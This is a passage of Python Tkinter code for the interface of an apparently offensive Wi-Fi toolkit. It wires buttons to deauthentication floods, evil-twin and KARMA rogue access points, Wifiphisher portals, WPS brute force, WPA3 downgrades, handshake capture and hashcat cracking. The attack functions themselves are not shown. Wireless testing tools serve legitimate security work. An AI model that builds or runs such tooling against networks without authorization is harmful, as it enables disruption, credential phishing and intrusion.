    fr = Frame(log_nb, bg=BGC)
    log_nb.add(fr, text=lbl)
    log_tabs[k] = fr

# Create log panes (keep variable names used throughout the app)
def _make_log_tab(parent, widget_ref_name):
    """Create a log text widget with a copy-all button."""
    f = Frame(parent, bg=BGC)
    f.pack(fill=BOTH, expand=True)
    
    btn_row = Frame(f, bg=BGC)
    btn_row.pack(side=BOTTOM, fill=X, padx=6, pady=(0, 6))
    
    txt = scrolledtext.ScrolledText(f, width=115, height=16, bg="#0d0d17", fg=NEON, font=("Consolas", 10))
    txt.pack(fill=BOTH, expand=True, padx=6, pady=(6, 0))
    
    def _copy_all():
        content = txt.get("1.0", END).strip()
        try:
            root.clipboard_clear()
            root.clipboard_append(content)
            root.update_idletasks()
            messagebox.showinfo("Copied", f"Copied {len(content)} chars to clipboard")
        except Exception as e:
            messagebox.showerror("Copy failed", str(e))
    
    def _copy_selection(_evt=None):
        try:
            sel = txt.get("sel.first", "sel.last")
        except Exception:
            sel = ""
        if not sel:
            return "break"
        try:
            root.clipboard_clear()
            root.clipboard_append(sel)
            root.update_idletasks()
        except Exception:
            pass
        return "break"

    def _paste_at_cursor(_evt=None):
        # Allow pasting into the log widget (useful for sharing/annotating logs).
        try:
            data = root.clipboard_get()
        except Exception:
            return "break"
        try:
            txt.insert(INSERT, data)
            txt.see(END)
        except Exception:
            pass
        return "break"

    Button(btn_row, text="Copy All", bg="#2a2a3d", fg="white", command=_copy_all).pack(side=LEFT, padx=4)

    # Enable typical clipboard keybinds even in scrolledtext widgets.
    txt.bind("<Control-c>", _copy_selection)
    txt.bind("<Control-C>", _copy_selection)
    txt.bind("<Control-Shift-C>", _copy_selection)
    txt.bind("<Control-v>", _paste_at_cursor)
    txt.bind("<Control-V>", _paste_at_cursor)
    
    globals()[widget_ref_name] = txt
    return txt

scan_out = _make_log_tab(log_tabs["scan"], "scan_out")
att_out = _make_log_tab(log_tabs["attack"], "att_out")
crack_out = _make_log_tab(log_tabs["crack"], "crack_out")
hashid_out = _make_log_tab(log_tabs["hash"], "hashid_out")
cleaner_out = _make_log_tab(log_tabs["clean"], "cleaner_out")
utils_out = _make_log_tab(log_tabs["utils"], "utils_out")

for _w in (scan_out, att_out, crack_out, hashid_out, cleaner_out, utils_out):
    ui_log.register(_w)

main_pane.add(nb, weight=3)
main_pane.add(log_nb, weight=2)

# ── Scan tab ---------------------------------------------------------------
ts=tabs["scan"]
row=Frame(ts,bg=BGC); row.pack(fill=X,pady=4)
iface_menu=OptionMenu(row,iface_var,*iw_interfaces()); iface_menu.grid(row=0,column=0,padx=4)
refresh_iface_menu()
Button(row,text="EnableMon",bg=ACCENT,fg="white",command=lambda:set_monitor(iface_var.get(),True,box=scan_out)).grid(row=0,column=1,padx=2)
Button(row,text="DisableMon",bg="#ff0030",fg="white",command=lambda:set_monitor(iface_var.get(),False,box=scan_out)).grid(row=0,column=2,padx=2)

# Killer belongs next to scan controls (it affects scanning reliability).
Checkbutton(
    row,
    text="Killer",
    variable=killer_enabled,
    command=lambda: toggle_killer(scan_out),
    bg=BGC,
    fg=NEON,
    selectcolor=BGC,
    activebackground=BGC,
).grid(row=0, column=3, padx=(10, 6))

Label(row,text="Dwell s",bg=BGC,fg=NEON).grid(row=0,column=4,sticky="e")
Spinbox(row,from_=15,to=180,textvariable=scan_time,width=6).grid(row=0,column=5,sticky="w",padx=(0,6))
Button(row,text="Focused",bg=ACCENT,fg="white",command=lambda:threading.Thread(target=do_scan,daemon=True).start()).grid(row=0,column=6,padx=2)
Button(row,text="Hop",bg=ACCENT,fg="white",command=lambda:threading.Thread(target=do_scan,kwargs={'channel_hop':True},daemon=True).start()).grid(row=0,column=7,padx=2)
Button(row,text="Stop Scan",bg="#ff0030",fg="white",command=stop_scan).grid(row=0,column=8,padx=6)
Frame(ts,height=2,bg=NEON).pack(fill=X,pady=6)
nrow=Frame(ts,bg=BGC); nrow.pack(fill=X,pady=2)
Label(nrow,text="nmap Target",bg=BGC,fg=NEON).grid(row=0,column=0,padx=4)
Entry(nrow,textvariable=nmap_target,width=18).grid(row=0,column=1)
OptionMenu(nrow,nmap_profile,"Quick Ping","Top-100 Ports","Full TCP","OS Detect","Vuln Script","Custom").grid(row=0,column=2,padx=4)
custom_entry=Entry(nrow,textvariable=nmap_custom,width=22,state="disabled"); custom_entry.grid(row=0,column=3,padx=4)
nmap_profile.trace_add("write",lambda *_: custom_entry.config(state="normal" if nmap_profile.get()=="Custom" else "disabled"))
Button(nrow,text="Run nmap",bg=ACCENT,fg="white",command=lambda:threading.Thread(target=start_nmap_scan,daemon=True).start()).grid(row=0,column=4,padx=4)

# Networks table (select target here)
net_box = ttk.LabelFrame(ts, text="🛰 NETWORKS", style="Nc.TLabelframe")
net_box.pack(fill=X, padx=8, pady=(6, 4))

frow = Frame(net_box, bg=BGC)
frow.pack(fill=X, padx=8, pady=6)
Label(frow, text="Filter", bg=BGC, fg=NEON, font=("Consolas", 10, "bold")).pack(side=LEFT)
net_filter_entry = ttk.Entry(frow, textvariable=net_filter_var, width=30)
net_filter_entry.pack(side=LEFT, padx=8)
Button(
    frow,
    text="Clear",
    bg="#2a2a3d",
    fg="white",
    command=lambda: (net_filter_var.set(""), refresh_network_tree()),
).pack(side=LEFT)

# Re-render table as you type.
net_filter_var.trace_add("write", lambda *_: refresh_network_tree())

tree_wrap = Frame(net_box, bg=BGC)
tree_wrap.pack(fill=X, padx=8, pady=(0, 8))

net_tree = ttk.Treeview(tree_wrap, columns=_TREE_COLS, show="headings", height=6, style="Nc.Treeview")
vsb = ttk.Scrollbar(tree_wrap, orient="vertical", command=net_tree.yview)
net_tree.configure(yscrollcommand=vsb.set)

net_tree.heading("idx", text="#", command=lambda: _tree_sortby(net_tree, "idx", _tree_sort_state.get("idx", False)))
net_tree.heading("bssid", text="BSSID", command=lambda: _tree_sortby(net_tree, "bssid", _tree_sort_state.get("bssid", False)))
net_tree.heading("ch", text="CH", command=lambda: _tree_sortby(net_tree, "ch", _tree_sort_state.get("ch", False)))
net_tree.heading("enc", text="ENC", command=lambda: _tree_sortby(net_tree, "enc", _tree_sort_state.get("enc", False)))
net_tree.heading("wps", text="WPS", command=lambda: _tree_sortby(net_tree, "wps", _tree_sort_state.get("wps", False)))
net_tree.heading("essid", text="ESSID", command=lambda: _tree_sortby(net_tree, "essid", _tree_sort_state.get("essid", False)))

net_tree.column("idx", width=42, anchor="e", stretch=False)
net_tree.column("bssid", width=160, anchor="w", stretch=False)
net_tree.column("ch", width=60, anchor="center", stretch=False)
net_tree.column("enc", width=80, anchor="center", stretch=False)
net_tree.column("wps", width=60, anchor="center", stretch=False)
net_tree.column("essid", width=420, anchor="w", stretch=True)

net_tree.pack(side=LEFT, fill=X, expand=True)
vsb.pack(side=LEFT, fill=Y)

# WPS rows get a subtle highlight.
net_tree.tag_configure("wps", background="#140b1d")

net_tree.bind("<<TreeviewSelect>>", _on_network_select)
net_tree.bind("<Double-1>", _on_network_activate)
net_tree.bind("<Button-3>", _on_network_right_click)

refresh_network_tree()

Button(
    ts,
    text="Open Scan Log",
    bg="#2a2a3d",
    fg="white",
    command=lambda: log_nb.select(0),
).pack(anchor="e", padx=10, pady=(0, 6))

# ── Attack tab : scrollable canvas ----------------------------------------
ta=tabs["attack"]
attack_canvas=Canvas(ta,bg=BGC,highlightthickness=0)
attack_vsb=ttk.Scrollbar(ta,orient="vertical",command=attack_canvas.yview)
attack_canvas.configure(yscrollcommand=attack_vsb.set)
attack_vsb.pack(side=RIGHT,fill=Y); attack_canvas.pack(side=LEFT,fill=BOTH,expand=True)
scroll_f=Frame(attack_canvas,bg=BGC); attack_canvas.create_window((0,0),window=scroll_f,anchor="nw")
scroll_f.bind("<Configure>",lambda e: attack_canvas.configure(scrollregion=attack_canvas.bbox("all")))
attack_canvas.bind_all("<MouseWheel>",lambda e: attack_canvas.yview_scroll(int(-e.delta/120),"units"))
for ev in ("<Button-4>","<Button-5>"):
    attack_canvas.bind_all(ev,lambda e, ev=ev: attack_canvas.yview_scroll(1 if ev=="<Button-5>" else -1,"units"))

# Target info bar (selected from Scan tab network table)
tbar = Frame(scroll_f, bg=BGC)
tbar.pack(fill=X, padx=10, pady=(6, 4))
Label(tbar, text="TARGET", bg=BGC, fg=ACCENT, font=("Consolas", 10, "bold")).pack(side=LEFT)
Label(tbar, textvariable=target_info_var, bg=BGC, fg="white", font=("Consolas", 9)).pack(side=LEFT, padx=10)
Label(tbar, textvariable=target_intel_var, bg=BGC, fg=NEON, font=("Consolas", 8)).pack(side=LEFT, padx=10)
Button(
    tbar,
    text="Clear",
    bg="#2a2a3d",
    fg="white",
    command=lambda: target_var.set(""),
).pack(side=RIGHT)
Button(
    tbar,
    text="Go Scan",
    bg="#2a2a3d",
    fg="white",
    command=lambda: nb.select(tabs["scan"]),
).pack(side=RIGHT, padx=6)

client_box = ttk.LabelFrame(scroll_f, text="👥 CLIENTS", style="Nc.TLabelframe")
client_box.pack(fill=X, padx=8, pady=(6, 4))
client_tree = ttk.Treeview(client_box, columns=("Client MAC", "Power", "Packets"), show="headings", height=4, style="Nc.Treeview")
client_vsb = ttk.Scrollbar(client_box, orient="vertical", command=client_tree.yview)
client_tree.configure(yscrollcommand=client_vsb.set)
client_tree.heading("Client MAC", text="Client MAC")
client_tree.heading("Power", text="Power")
client_tree.heading("Packets", text="Packets")
client_tree.column("Client MAC", width=160, anchor="w")
client_tree.column("Power", width=80, anchor="center")
client_tree.column("Packets", width=80, anchor="center")
client_tree.pack(side=LEFT, fill=X, expand=True)
client_vsb.pack(side=LEFT, fill=Y)

client_var = StringVar()

def _on_client_select(_evt=None):
    if client_tree is None:
        return
    sel = client_tree.selection()
    if not sel:
        return
    client_var.set(str(sel[0]))

client_tree.bind("<<TreeviewSelect>>", _on_client_select)

def refresh_client_tree(*_):
    if client_tree is None:
        return
    _tree_clear(client_tree)
    
    t = _selected_network()
    if not t:
        return

    bssid, _, _, _, _ = t
    
    # Find the latest CSV file for the target BSSID
    latest_csv = None
    latest_time = 0
    for f in os.listdir(CAP_DIR):
        if f.endswith(".csv") and bssid.replace(":", "-") in f:
            f_path = os.path.join(CAP_DIR, f)
            f_time = os.path.getmtime(f_path)
            if f_time > latest_time:
                latest_time = f_time
                latest_csv = f_path

    if not latest_csv:
        return

    with open(latest_csv, newline="") as f:
        reader = csv.reader(f)
        in_client_section = False
        for row in reader:
            if not row:
                continue
            if row[0].strip() == "Station MAC":
                in_client_section = True
                continue
            if in_client_section:
                if len(row) > 4 and row[0].strip() != bssid:
                    mac = row[0].strip()
                    power = row[3].strip()
                    packets = row[4].strip()
                    client_tree.insert("", "end", iid=mac, values=(mac, power, packets))

target_var.trace_add("write", refresh_client_tree)

ATTACK_ACTIONS = [
    ("cap", "📡 Captures", [
        ("PMKID Capture", start_pmkid),
        ("4-Way Handshake", start_handshake),
        ("Mass-PMKID Sweep", start_mass_pmkid),
        ("Capture All Handshakes", start_capture_all_handshakes),
        ("Targeted Handshake Capture", start_targeted_handshake_capture),
        ("Targeted PMKID Capture", start_targeted_pmkid_capture),
    ]),
    ("rog", "🪪 Rogue AP / Phish", [
        ("Evil Twin AP", start_evil_twin),
        ("MANA Attack", start_mana_attack),
        ("KARMA Rogue-AP", start_karma),
        ("Wifiphisher Portal", start_wifiphisher),
        ("EAPHammer Enterprise", start_eaphammer),
        ("EAP-MD5 Challenge", start_eap_md5_challenge),
    ]),
    ("dis", "⚔️ Disruption", [
        ("Deauth Flood", start_deauth),
        ("Deauth Flood (BC)", start_deauth_broadcast),
        ("Known Beacon Attack", start_known_beacon_attack),
        ("Beacon Spam", start_beacon),
        ("Probe-Resp Flood", start_probe_flood),
        ("SSID Brute-Force", start_ssid_brute_force),
        ("Authentication DoS", start_auth_dos),
        ("Assoc Flood", start_association_flood),
        ("MIC Failure (TKIP)", start_mic_failure),
        ("802.11w Downgrade", start_80211w_downgrade),
    ]),
    ("exp", "🛠 WPA Exploits", [
        ("WPS Bruteforce", start_wps),
        ("WPS Null PIN", start_wps_null_pin),
        ("WPS Known PINs", start_wps_known_pins),
        ("WPA3 → WPA2 Down", start_wpa3_downgrade),
        ("SAE/OWE Downgrade", start_sycophant),
        ("TKIP Chop-Chop", start_chopchop),
        ("TKIP Michael Reset", start_michael_reset),
        ("Kr00k-Hunter", start_kr00k),
    ]),
    ("leg", "⚰️ Legacy Attacks", [
        ("Caffe-Latte Attack", start_caffe_latte_attack),
        ("Hirte Attack", start_hirte_attack),
        ("Fragmentation Attack", start_fragmentation_attack),
        ("ARP Replay Attack", start_arp_replay_attack),
    ]),
]

attack_frames = {}
main_attack_frame = Frame(scroll_f, bg=BGC)
main_attack_frame.pack(fill=X, padx=8, pady=4)
col1 = Frame(main_attack_frame, bg=BGC)
col2 = Frame(main_attack_frame, bg=BGC)
col1.grid(row=0, column=0, sticky="nsew")
col2.grid(row=0, column=1, sticky="nsew")
main_attack_frame.columnconfigure(0, weight=1)
main_attack_frame.columnconfigure(1, weight=1)

for key, title, _btns in ATTACK_ACTIONS:
    parent_col = col1 if key in ("cap", "rog", "dis") else col2
    lf = ttk.LabelFrame(parent_col, text=title, style="Nc.TLabelframe")
    lf.pack(fill=X, padx=8, pady=4)
    attack_frames[key] = lf


def _grid(frame, buttons):
    for idx, (txt, fn) in enumerate(buttons):
        r, c = divmod(idx, 2)
        Button(
            frame,
            text=txt,
            command=fn,
            bg=ACCENT,
            fg="white",
            font=FONT,
            height=1,
            width=BTN_W,
            pady=1,
        ).grid(row=r, column=c, padx=2, pady=1, sticky="w")
    for c in (0, 1):
        frame.columnconfigure(c, weight=0)


for key, _title, btns in ATTACK_ACTIONS:
    _grid(attack_frames[key], btns)

Button(scroll_f,text="Stop Attack",bg="#ff0030",fg="white",font=FONT,
       height=1,width=BTN_W*2,command=stop_attack
).pack(fill=X,padx=20,pady=6)

Button(
    scroll_f,
    text="Open Attack Log",
    bg="#2a2a3d",
    fg="white",
    command=lambda: log_nb.select(1),
).pack(fill=X, padx=20, pady=(0, 8))

row=Frame(scroll_f,bg=BGC); row.pack(fill=X,padx=10,pady=(0,8))
Entry(row,textvariable=input_var,font=("Consolas",9),
      bg="#181818",fg="white",insertbackground="white"
).pack(side=LEFT,fill=X,expand=True)
Button(row,text="Send",bg=ACCENT,fg="white",font=FONT,width=BTN_W,command=send_to_proc).pack(side=LEFT,padx=6)
row.bind_all("<Return>",send_to_proc)

# ── Crack tab --------------------------------------------------------------
tc=tabs["crack"]
crack_frame = Frame(tc, bg=BGC)
crack_frame.pack(fill=X, padx=8, pady=4)
col1 = ttk.LabelFrame(crack_frame, text="Hashcat", style="Nc.TLabelframe")
col2 = ttk.LabelFrame(crack_frame, text="Aircrack-ng", style="Nc.TLabelframe")
col1.grid(row=0, column=0, sticky="nsew", padx=4, pady=4)
col2.grid(row=0, column=1, sticky="nsew", padx=4, pady=4)
crack_frame.columnconfigure(0, weight=1)
crack_frame.columnconfigure(1, weight=1)

# Hashcat column
Label(col1, text="Capture File:", bg=BGC, fg=NEON).pack(pady=2)
Entry(col1,textvariable=pcap_var,width=40).pack(pady=2)
Button(col1,text="Browse",command=browse_pcap).pack()
Label(col1, text="Wordlist:", bg=BGC, fg=NEON).pack(pady=2)
Entry(col1,textvariable=word_var,width=40).pack(pady=2)
Button(col1,text="Browse",command=browse_word).pack()
Button(col1,text="Start Crack",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=crack,daemon=True).start()).pack(pady=10)

# Aircrack-ng column
Label(col2, text="Capture File:", bg=BGC, fg=NEON).pack(pady=2)
Entry(col2,textvariable=pcap_var,width=40).pack(pady=2)
Button(col2,text="Browse",command=browse_pcap).pack()
Label(col2, text="Wordlist:", bg=BGC, fg=NEON).pack(pady=2)
Entry(col2,textvariable=word_var,width=40).pack(pady=2)
Button(col2,text="Browse",command=browse_word).pack()
Button(col2,text="WPA/WPA2 Brute-force",bg=ACCENT,fg="white",
       command=lambda:threading.Thread(target=start_wpa_bruteforce,daemon=True).start()).pack(pady=10)

Button(tc,text="Open Crack Log",bg="#2a2a3d",fg="white",command=lambda: log_nb.select(2)).pack(pady=(6, 0))

# ── Hash tab ---------------------------------------------------------------
th=tabs["hash"]
hash_frame = ttk.LabelFrame(th, text="🔎 Identify Hashes", style="Nc.TLabelframe")
hash_frame.pack(fill=X, padx=8, pady=4)

hash_input_frame = Frame(hash_frame, bg=BGC)
hash_input_frame.pack(fill=X, padx=8, pady=4)
Label(hash_input_frame, text="Hash:", bg=BGC, fg=NEON).pack(side=LEFT, padx=4)
Entry(hash_input_frame,textvariable=hash_input,width=60).pack(side=LEFT, padx=4)
Button(hash_input_frame,text="Identify",bg=ACCENT,fg="white",command=hashid_action).pack(side=LEFT, padx=4)
Button(hash_input_frame,text="Browse File",bg="#2a2a3d",fg="white",command=lambda: hash_input.set(filedialog.askopenfilename())).pack(side=LEFT, padx=4)

hash_results_frame = Frame(hash_frame, bg=BGC)
hash_results_frame.pack(fill=BOTH, expand=True, padx=8, pady=4)
hash_tree = ttk.Treeview(hash_results_frame, columns=("Hash", "Identified As"), show="headings", height=10, style="Nc.Treeview")
hash_vsb = ttk.Scrollbar(hash_results_frame, orient="vertical", command=hash_tree.yview)
hash_tree.configure(yscrollcommand=hash_vsb.set)
hash_tree.heading("Hash", text="Hash")
hash_tree.heading("Identified As", text="Identified As")
hash_tree.column("Hash", width=400, anchor="w")
hash_tree.column("Identified As", width=400, anchor="w")
hash_tree.pack(side=LEFT, fill=BOTH, expand=True)
hash_vsb.pack(side=LEFT, fill=Y)

def hashid_action():
    _tree_clear(hash_tree)
    h_input = hash_input.get().strip()
    if not h_input:
        return

    if os.path.isfile(h_input):
        with open(h_input, "r") as f:
            for line in f:
                h = line.strip()
                if h:
                    result = identify_hash(h)
                    hash_tree.insert("", "end", values=(h, result))
    else:
        result = identify_hash(h_input)
        hash_tree.insert("", "end", values=(h_input, result))

Button(th,text="Open Hash Log",bg="#2a2a3d",fg="white",command=lambda: log_nb.select(3)).pack(pady=(6, 0))

# ── Cleaner tab ------------------------------------------------------------
cl=tabs["clean"]
cleaner_frame = ttk.LabelFrame(cl, text="🧹 Cleaner & Converter", style="Nc.TLabelframe")
cleaner_frame.pack(fill=X, padx=8, pady=4)

cleaner_input_frame = Frame(cleaner_frame, bg=BGC)
cleaner_input_frame.pack(fill=X, padx=8, pady=4)
Label(cleaner_input_frame, text="Input File:", bg=BGC, fg=NEON).pack(side=LEFT, padx=4)
Entry(cleaner_input_frame,textvariable=pcap_var,width=60).pack(side=LEFT, padx=4)
Button(cleaner_input_frame,text="Browse",command=browse_pcap).pack(side=LEFT, padx=4)

cleaner_actions_frame = Frame(cleaner_frame, bg=BGC)
cleaner_actions_frame.pack(fill=X, padx=8, pady=4)
Button(cleaner_actions_frame,text="Clean pcapng",bg=ACCENT,fg="white",command=clean_capture).pack(side=LEFT, padx=4)
Button(cleaner_actions_frame,text="Convert to .cap",bg=ACCENT,fg="white",command=lambda: convert_to_cap()).pack(side=LEFT, padx=4)
Button(cleaner_actions_frame,text="Convert to .hccapx",bg=ACCENT,fg="white",command=lambda: convert_to_hccapx()).pack(side=LEFT, padx=4)

Button(cl,text="Open Cleaner Log",bg="#2a2a3d",fg="white",command=lambda: log_nb.select(4)).pack(pady=(6, 0))

def clean_capture():
    cap=pcap_var.get()
    if not cap:
        messagebox.showwarning("Missing","Select a capture file"); return
    out=cap.replace(".pcapng","_cleaned.pcapng")
    run(["hcxpcapngtool","--cleanall","-o",out,cap]).wait()
    cleaner_out.insert(END,f"[+] Cleaned → {out}\n")

def convert_to_cap():
    messagebox.showinfo("TODO", "Convert to .cap not implemented yet.")

def convert_to_hccapx():
    messagebox.showinfo("TODO", "Convert to .hccapx not implemented yet.")

# ── Utilities tab ----------------------------------------------------------
ut=tabs["utils"]
Checkbutton(ut,text="Sticky Monitor (leave iface in mon mode)",variable=sticky_mon,bg=BGC,fg=NEON,selectcolor=BGC,activebackground=BGC).pack(anchor="w",padx=12,pady=4)
Checkbutton(
    ut,
    text="DRY RUN (log commands, do not execute)",
    variable=dry_run,
    bg=BGC,
    fg=ACCENT,
    selectcolor=BGC,
    activebackground=BGC,
).pack(anchor="w", padx=12, pady=(10, 2))

Checkbutton(
    ut,
    text="PREVIEW COMMANDS (copy + execute)",
    variable=preview_before_run,
    bg=BGC,
    fg=NEON,
    selectcolor=BGC,
    activebackground=BGC,
).pack(anchor="w", padx=12, pady=(0, 8))

Button(ut,text="Refresh Stats",bg=ACCENT,fg="white",command=show_stats).pack(pady=4)
Button(ut,text="Run Dependency Doctor",bg=ACCENT,fg="white",command=dependency_doctor).pack(pady=2)

# Admin / diagnostics
uadm = ttk.LabelFrame(ut, text="🧰 Admin & Diagnostics", style="Nc.TLabelframe")
uadm.pack(fill=X, padx=10, pady=(10, 6))

urow = Frame(uadm, bg=BGC)
urow.pack(fill=X, padx=10, pady=(10, 6))
Button(urow, text="Interface Info", bg=ACCENT, fg="white", command=utilities_iface_info).pack(side=LEFT, padx=4)
Button(urow, text="Preflight", bg=ACCENT, fg="white", command=utilities_preflight).pack(side=LEFT, padx=4)
Button(urow, text="Restore Network", bg="#2a2a3d", fg="white", command=utilities_restore_network).pack(side=LEFT, padx=4)
Button(urow, text="Open Utilities Log", bg="#2a2a3d", fg="white", command=lambda: log_nb.select(5)).pack(side=RIGHT, padx=4)

# Vendor lookup row
vrow = Frame(uadm, bg=BGC)
vrow.pack(fill=X, padx=10, pady=(0, 6))
Label(vrow, text="Vendor lookup (MAC/BSSID/OUI):", bg=BGC, fg=NEON).pack(side=LEFT)
Entry(vrow, textvariable=vendor_lookup_var, width=22, bg="#0b0b14", fg="white", insertbackground="white").pack(side=LEFT, padx=6)
Button(vrow, text="Lookup", bg=ACCENT, fg="white", command=utilities_vendor_lookup).pack(side=LEFT)

# Capture sanity row
crow = Frame(uadm, bg=BGC)
crow.pack(fill=X, padx=10, pady=(0, 10))
Label(crow, text="Capture sanity (.pcap/.pcapng):", bg=BGC, fg=NEON).pack(side=LEFT)
Entry(crow, textvariable=cap_sanity_var, width=34, bg="#0b0b14", fg="white", insertbackground="white").pack(side=LEFT, padx=6)
Button(crow, text="Browse", bg="#2a2a3d", fg="white", command=_browse_sanity_capture).pack(side=LEFT, padx=4)
Button(crow, text="Check", bg=ACCENT, fg="white", command=utilities_capture_sanity).pack(side=LEFT)

# Existing broadband monitor
bwF=Frame(ut,bg=BGC); bwF.pack(pady=10,fill=X)
Label(bwF,text="Broadband iface:",bg=BGC,fg=NEON).pack(side=LEFT)
Entry(bwF,textvariable=mon_iface_var,width=12).pack(side=LEFT,padx=4)
Button(bwF,text="Start",bg=ACCENT,fg="white",command=start_bw_monitor).pack(side=LEFT,padx=4)
Button(bwF,text="Stop",bg="#ff0030",fg="white",command=stop_bw_monitor).pack(side=LEFT)
fig=Figure(figsize=(5,2.2),dpi=100,facecolor="#0d0d17"); ax=fig.add_subplot(111)
ax.set_title("kbit/s (60 s)",color=NEON,fontsize=9)
ax.tick_params(axis='x',colors="white"); ax.tick_params(axis='y',colors="white")
ln_up,=ax.plot([],[],label="Up",linewidth=1); ln_dn,=ax.plot([],[],label="Down",linewidth=1)
ax.legend(facecolor="#0d0d17",edgecolor="#0d0d17",labelcolor="white")
canvas=FigureCanvasTkAgg(fig,master=ut); canvas.get_tk_widget().pack(fill=X,padx=10)

# ── Artifacts tab ----------------------------------------------------------
ar = tabs["art"]

hdr = ttk.LabelFrame(ar, text="📁 CAPTURE ARTIFACTS", style="Nc.TLabelframe")
hdr.pack(fill=BOTH, expand=True, padx=10, pady=10)

bar = Frame(hdr, bg=BGC)
bar.pack(fill=X, padx=10, pady=(10, 6))
Button(bar, text="Refresh", bg="#2a2a3d", fg="white", command=refresh_artifacts).pack(side=LEFT)
Button(bar, text="Open", bg="#2a2a3d", fg="white", command=open_artifact).pack(side=LEFT, padx=6)
Button(bar, text="Delete", bg="#ff0030", fg="white", command=delete_artifact).pack(side=LEFT)
Button(bar, text="Open Folder", bg="#2a2a3d", fg="white", command=open_artifacts_folder).pack(side=LEFT, padx=6)

Label(bar, text="Type", bg=BGC, fg=NEON, font=("Consolas", 9)).pack(side=LEFT, padx=(18, 4))
OptionMenu(bar, art_filter_var, "All", "All", "Captures", "Logs", "CSVs", "Converted").pack(side=LEFT)
Label(bar, text="Search", bg=BGC, fg=NEON, font=("Consolas", 9)).pack(side=LEFT, padx=(12, 4))
Entry(bar, textvariable=art_search_var, width=18, bg="#0b0b14", fg="white", insertbackground="white").pack(side=LEFT)
Checkbutton(bar, text="Auto", variable=art_autorefresh, bg=BGC, fg=NEON, selectcolor=BGC, activebackground=BGC).pack(side=LEFT, padx=(10, 0))

Label(bar, textvariable=art_status_var, bg=BGC, fg=NEON, font=("Consolas", 9)).pack(side=RIGHT)

wrap = Frame(hdr, bg=BGC)
wrap.pack(fill=BOTH, expand=True, padx=10, pady=(0, 10))

art_tree = ttk.Treeview(wrap, columns=_ART_COLS, show="headings", height=16, style="Nc.Treeview")
art_tree.heading("name", text="File", command=lambda: _art_sortby("name", _art_sort_state.get("name", False)))
art_tree.heading("size", text="Size", command=lambda: _art_sortby("size", _art_sort_state.get("size", False)))
art_tree.heading("mtime", text="Modified", command=lambda: _art_sortby("mtime", _art_sort_state.get("mtime", False)))
art_tree.column("name", width=560, anchor="w")
art_tree.column("size", width=110, anchor="e", stretch=False)
art_tree.column("mtime", width=200, anchor="w", stretch=False)

avsb = ttk.Scrollbar(wrap, orient="vertical", command=art_tree.yview)
art_tree.configure(yscrollcommand=avsb.set)
art_tree.pack(side=LEFT, fill=BOTH, expand=True)
avsb.pack(side=LEFT, fill=Y)

art_tree.bind("<Double-1>", lambda _e: open_artifact())
art_tree.bind("<Button-3>", _on_artifact_right_click)

# Live filtering
art_filter_var.trace_add("write", lambda *_: refresh_artifacts())
art_search_var.trace_add("write", lambda *_: refresh_artifacts())

refresh_artifacts()

# ── Reset tab --------------------------------------------------------------
rt=Frame(nb,bg=BGC); nb.add(rt,text="♻️ Reset")
Button(rt,text="Reset Toolkit",width=26,bg=ACCENT,fg="white",command=lambda:reset_toolkit(False)).pack(pady=12)
Button(rt,text="Reset & Exit",width=26,bg="#ff0030",fg="white",command=lambda:reset_toolkit(True)).pack()

# Start status loop after UI is built.
_update_status_loop()
_update_dashboard_loop()
_artifacts_autorefresh_loop()

# Global keybinds
root.bind_all("<Control-p>", show_palette)

# ─────────── main ─────────────────────────────────────────────────────────
def _on_close():
    try:
        save_config()
    except Exception:
        pass
    try:
        stop_attack()
        stop_scan()
    except Exception:
        pass
    try:
        root.destroy()
    except Exception:
        try:
            root.quit()
        except Exception:
            pass


root.protocol("WM_DELETE_WINDOW", _on_close)


if __name__=="__main__":
    if os.geteuid()!=0:
        messagebox.showerror("Need root","Run with sudo."); sys.exit(1)
    root.mainloop()
